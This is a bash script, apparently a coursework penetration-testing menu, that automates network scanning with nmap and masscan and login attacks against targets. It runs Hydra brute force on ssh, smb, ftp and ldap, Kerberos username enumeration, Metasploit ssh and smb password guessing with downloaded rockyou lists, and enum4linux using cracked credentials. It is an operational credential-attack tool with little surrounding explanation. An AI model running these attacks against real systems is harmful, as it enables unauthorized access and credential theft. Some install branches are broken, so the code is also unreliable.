#!/bin/bash
# Install relevant applications on the local computer.
# Allow the user to choose two methods of scanning and two different network attacks to run via your script.
# Every scan or attack should be logged and saved with the date and used arguments.

#######################################################################
# Main Variables
function WELCOME () 
{
#create font variable
UNDERLINE='\e[4m'
BOLD='\e[1m'
RESET='\e[0m'
GREEN='\e[32m'
RED='\e[31m'

######################## -- Main Menu -- #######################################
# create a interactive Header and Menu

echo -ne "$BOLD 

WELCOME TO RAYDEN's SCRIPT
VERSION 2.0 $RESET
" 
 
echo -ne "$BOLD$GREEN Main MENU $RESET"

echo -ne "
$GREEN 1) $RESET Nmap		: Gather Open Ports, Service Version and OS Info Of A Target
$GREEN 2) $RESET Masscan		: Gather IP Addresses With Opened SSH and SMB ports
$GREEN 3) $RESET Hydra		: Brute Force Both Username and Password via ssh/smb/ftp/ldap2 With Known IP
$GREEN 4) $RESET Kerbrute		: Gather Usernames From Kerberos if You Know The Domain Name and IP
$GREEN 5) $RESET Mataspolit		: Crack Password with Known Username and IP address through SSH/SMB
$GREEN 6) $RESET Enmu4linux		: Gather More Usernames, Password Policy From The Cracked User/Password
$RED E) $RESET EXIT		: Exit Menu
				
"
					
echo -ne "$BOLD$GREEN Please Select The Option $RESET"
read OPTION

if [[ $OPTION = 1 || $OPTION = 2 || $OPTION = 3 || $OPTION = 4 || $OPTION = 5 || $OPTION = 6 || $OPTION = E ]]

then
:

else
echo -ne "$BOLD$RED
Please Try Again With A Valid Option"
sleep 1
WELCOME
fi


########################### -- Option 1 -- ###################################
case $OPTION in

	#Check Nmap exist, Gather open ports, service version, OS and save output

	1)
	read -p " Which IP Address to Scan : " IP1A
	function RUNNMAP ()
	{
	cd 
	mkdir RaydenOutput 2>/dev/null 
	TIMESTAMP=$(date +%d%m%y_%H%M%S)
	FILENAME1A=NMAPScan_$TIMESTAMP

	sudo nmap -sV -O $IP1A -oG ~/RaydenOutput/$FILENAME1A

	echo -ne "$BOLD$RED Result is saved at ~/RaydenOutput/$FILENAME1A $RESET"
	sleep 1
	echo -e "\n"
	echo -ne "$BOLD$RED Exiting to Main Menu $RESET"
	sleep 1
	WELCOME

	}

	#Check/Install Nmap, and Run Function

	NMAP=$( which nmap )
	if [ -z $NMAP ]

	then
	sudo apt-get update
	sudo apt install nmap
	RUNNMAP

	else
	RUNNMAP
	fi
	;;

########################### -- Option 2 -- ###################################
	#Masscan - gather info which other IP address has port 22, 139 or 445 open
	2)
	TIMESTAMP=$(date +%d%m%y_%H%M%S)
	FILENAME1B=MASSCAN_$TIMESTAMP
	read -p "Which IP Range to Scan e.g 192.168.0.0/16 : " IP1B

	function RUNMASS ()
	{
	cd 
	mkdir RaydenOutput 2>/dev/null 

	sudo masscan -p 22,139,445 $IP1B -oG ~/RaydenOutput/$FILENAME1B

	cat ~/RaydenOutput/$FILENAME1B
	echo -en "$BOLD$RED Result is saved at ~/RaydenOutput/$FILENAME1B $RESET"
	sleep 1
	echo -en "$BOLD$RED Exiting to Main Menu $RESET"
	sleep 1
	WELCOME

	}

	#Check/Install Masscan
	MASS=$( which masscan )

	if [ -z $MASS ]

	then
	sudo apt-get update
	sudo apt install masscan
	RUNMASS

	else
	RUNMASS

	fi
	;;

######################### -- Option 3 -- ################################	
	#Hydra - Crack Both Username and Password via SSH/SMB With Known IP
	3)
	function RUNHYDR ()
	{
	read -p " Brute Force ssh, smb, ftp or ldap2 : " HYDRPROTO
	read -p " Please Enter Target IP Address : " HYDRIP
	TIMESTAMP=$(date +%d%m%y_%H%M%S)
	FILENAME2A=HYDRA_$TIMESTAMP
	
	echo "Command Used hydra -V -f -L $HYDRNAME -P $HYDRPASS $HYDRIP $HYDRPROTO" > ~/RaydenOutput/$FILENAME2A 
	
	hydra -V -f -L $HYDRNAME -P $HYDRPASS $HYDRIP $HYDRPROTO >> ~/RaydenOutput/$FILENAME2A
	
	cat ~/RaydenOutput/$FILENAME2A

	echo -en "$BOLD$RED Scan Completed, File Saved to ~/RaydenOutput/$FILENAME2A $RESET"
	sleep 1
	echo -en "$BOLD$RED Exiting to Main Menu $RESET"
	sleep 1
	WELCOME

	}

	#Use own userlist and password list?
	function OWNNAMELIST ()
	{
	read -p " Would You Like To Use Your Own Namelist ? Y or N : " OWNNAME

	if [ $OWNNAME = Y ]

	then
	cd 
	mkdir RaydenOutput 2>/dev/null 
	read -p " Please Key In The Path of Your Namelist : " HYDRNAME

		elif [ $OWNNAME = N ]
		then
		cd 
		mkdir RaydenOutput 2>/dev/null 
		cd RaydenOutput
		wget https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt 2>/dev/null 
		cd
	HYDRNAME=~/RaydenOutput/usernames.txt

	else 
	echo " Please Enter a Correct Option "
	sleep 1
	OWNNAMELIST

	fi

	}
	OWNNAMELIST

	function OWNPASSLIST ()
	{
	read -p " Would You Like To Use Your Own Password List ? Y or N : " OWNPASS

	if [ $OWNPASS = Y ]

	then
	cd 
	mkdir RaydenOutput 2>/dev/null 
	read -p " Please Key In The Path of Your Password List : " HYDRPASS

		elif [ $OWNPASS = N ]
		then
		cd 
		mkdir RaydenOutput 2>/dev/null 
		cd RaydenOutput
		wget https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz 2>/dev/null
		gzip -d rockyou.txt.gz
		cd
		HYDRPASS=~/RaydenOutput/rockyou.txt
	else
	echo " Please Enter a Correct Option "
	sleep 1
	OWNPASSLIST
	fi

	}
	OWNPASSLIST

	#Check/Install Hydra
	HYDR=$( which hydra )
	if [ -z "$HYDR" ]

	then 
	sudo apt update
	sudo apt install hydra
	RUNHYDR

	else
	RUNHYDR

	fi
	;;

######################### -- Option 4 -- ################################
	4)
	# Kerbrute - Gather Usernames From Kerberos (AD)

	function RUNKERB ()
	{
	TIMESTAMP=$(date +%d%m%y_%H%M%S)
	FILENAME1D=KERBRUTE_$TIMESTAMP
	sudo echo " $IP1D $DOMAIN1D " >> /etc/hosts

	echo "Command used kerbrute -domain $DOMAIN1D -users $NAMELIST" > ~/RaydenOutput/$FILENAME1D
	kerbrute -domain $DOMAIN1D -users $NAMELIST >> ~/RaydenOutput/$FILENAME1D
	cat ~/RaydenOutput/$FILENAME1D

	echo -en "$BOLD$RED Scan Completed, File Saved to ~/RaydenOutput/$FILENAME1D $RESET"
	sleep 1
	echo -e "\n"
	echo -en "$BOLD$RED Exiting to Main Menu $RESET"
	sleep 1
	WELCOME
	}

	#Custom or Default Namelist & install Python 3 / Pip3 / Kerbrute
	function INSTALLPPK ()
	{
	PIP3=$( which pip3 )
	KERB=$( which kerbrute)
	if [ -z "$PIP3" ]
	then 
	sudo apt update
	sudo apt install python3-pip
		if [ -z "$KERB" ]
		
		then 
		sudo pip3 install kerbrute
		
		
	elif [ -z "$KERB" ]
	then 
	sudo apt update
	sudo pip3 install kerbrute
	else
	:
				
		fi
	fi	
	}

	read -p " Please Enter the Domain Name " DOMAIN1D
	read -p " Please Enter IP Address of Domain Controller " IP1D
	echo " We will add the specified IP address and Domain name into /etc/hosts "
	echo -e "\n"
	read -p " Would You Like To Use Your Own Namelist to Enmurate? Y or N : " OWNLIST

	if [ $OWNLIST = Y ]

	then
	cd 
	mkdir RaydenOutput 2>/dev/null 
	read -p " Please Key In The Path of Your Namelist : " NAMELIST
	INSTALLPPK
	RUNKERB

	else
	cd 
	mkdir RaydenOutput 2>/dev/null 
	cd RaydenOutput
	wget https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt 2>/dev/null 
	cd
	NAMELIST=~/RaydenOutput/usernames.txt
	INSTALLPPK
	RUNKERB
	fi

	;;

######################### -- Option 5 -- ################################
	5)
	# metasploit - Crack Password with Known Username and IP address through SMB
	TIMESTAMP=$(date +%d%m%y_%H%M%S)
	RCFILENAME=RCMETA_$TIMESTAMP.rc
	FILENAME2B=META_$TIMESTAMP
		
	function RUNMATA ()
	{
	#create rc file
	
	echo "use $PROTOCOL" > ~/RaydenOutput/$RCFILENAME
	echo "set RHOSTS $MATARHOST" >> ~/RaydenOutput/$RCFILENAME
	echo "set $USER $MATAUSER" >> ~/RaydenOutput/$RCFILENAME
	echo "set PASS_FILE $MATAPASS" >> ~/RaydenOutput/$RCFILENAME
	echo 'run' >> ~/RaydenOutput/$RCFILENAME
	echo 'exit' >> ~/RaydenOutput/$RCFILENAME
	echo "$EXIT" >> ~/RaydenOutput/$RCFILENAME
	
	#run Mataspolit
	msfconsole -r ~/RaydenOutput/$RCFILENAME -o ~/RaydenOutput/$FILENAME2B.txt 2>/dev/null

	cat ~/RaydenOutput/$FILENAME2B.txt | grep -i success

	echo -en "$BOLD$RED Scan Completed, File Saved to ~/RaydenOutput/$FILENAME2B.txt $RESET"
	sleep 1
	echo -en "$BOLD$RED Exiting to Main Menu $RESET"
	sleep 1
	WELCOME
	}
	
	#Crack SSH or SMB
	function MATASSHSMB ()
	{
	read -p " Which Protocol Would u Like to Enumerate (smb or ssh)? : " MATAPROTO
	
	if [ $MATAPROTO = ssh ]
	
	then
	PROTOCOL=auxiliary/scanner/ssh/ssh_login
	USER=USERNAME
	EXIT='exit -y'
	
	elif [ $MATAPROTO = smb ]
	
	then 
	PROTOCOL=scanner/smb/smb_login
	USER=SMBUser
	
	else
	echo " Please Enter a Correct Option "
	sleep 1
	MATASSHSMB
	fi
	}
	MATASSHSMB
	
	#Specify IP address
	read -p " Enter IP Address of Target : " MATARHOST
	
	#Specify Username
	read -p " Enter Username Would You Like to Crack : " MATAUSER
	
	#Own Password List?
	function OWNPASSLIST ()
	{
	read -p " Would You Like To Use Your Own Password List ? Y or N : " OWNPASS2

	if [ $OWNPASS2 = Y ]

	then
	cd 
	mkdir RaydenOutput 2>/dev/null 
	read -p " Please Key In The Path of Your Password List : " MATAPASS
	

		elif [ $OWNPASS2 = N ]
		then
		cd 
		mkdir RaydenOutput 2>/dev/null 
		cd RaydenOutput
		wget https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz 2>/dev/null
		gzip -d rockyou.txt.gz
		cd
		MATAPASS=~/RaydenOutput/rockyou.txt
		
	else
	echo " Please Enter a Correct Option "
	sleep 1
	OWNPASSLIST
	
	fi
	}
	OWNPASSLIST
	
	#Check/Install metasploit
	META=$( which msfconsole )
	
	if [ -z "$META" ]

	then 
	sudo apt update
	sudo msfdb init
	RUNMATA

	else
	RUNMATA

	fi
	
	;;

######################### -- Option 6 -- ################################

	6)
	# Enum4linux - Gather More Usernames, Password Policy and Domain-names after Cracking First Set of User/Pass
	function RUNENMU ()
	{
	read -p " Which IP Address to Scan : " IP1C
	cd 
	mkdir RaydenOutput 2>/dev/null 

	TIMESTAMP=$(date +%d%m%y_%H%M%S)
	FILENAME1C=ENUM4_$TIMESTAMP

	echo "Command Used enum4linux -UP -u $ENUMUSER -p $ENUMPASS $IP1C " > ~/RaydenOutput/$FILENAME1C 

	enum4linux -UP -u $ENUMUSER -p $ENUMPASS $IP1C >> ~/RaydenOutput/$FILENAME1C

	cat ~/RaydenOutput/$FILENAME1C

	echo -en "$BOLD$RED Scan Completed, File Saved to ~/RaydenOutput/$FILENAME1C $RESET"
	sleep 1
	echo -en "$BOLD$RED Exiting to Main Menu $RESET"
	sleep 1
	
	WELCOME

	}
	
	read -p " Which Username Have You Cracked? : " ENUMUSER
	read -p " What Is The Cracked Password For $ENUMUSER ? : " ENUMPASS

	#Check/Install for Enum4linux and Samba else Run Function
	ENMU=$( which enum4linux )
	SAMB=$( which samba )

	if [ -z $ENMU ]
	then
	sudo apt-get update
	sudo apt install enum4linux
		elif [ -z $SAMB ]
		then
		apt install samba
		RUNENMU

	else
	RUNENMU

	fi
		
	;;

	
######################### -- Option E -- ################################

	E)
	#Exit
	echo -en "$BOLD$RED Good Bye $RESET"
	;;	


esac


#End of Main Menu
}
WELCOME


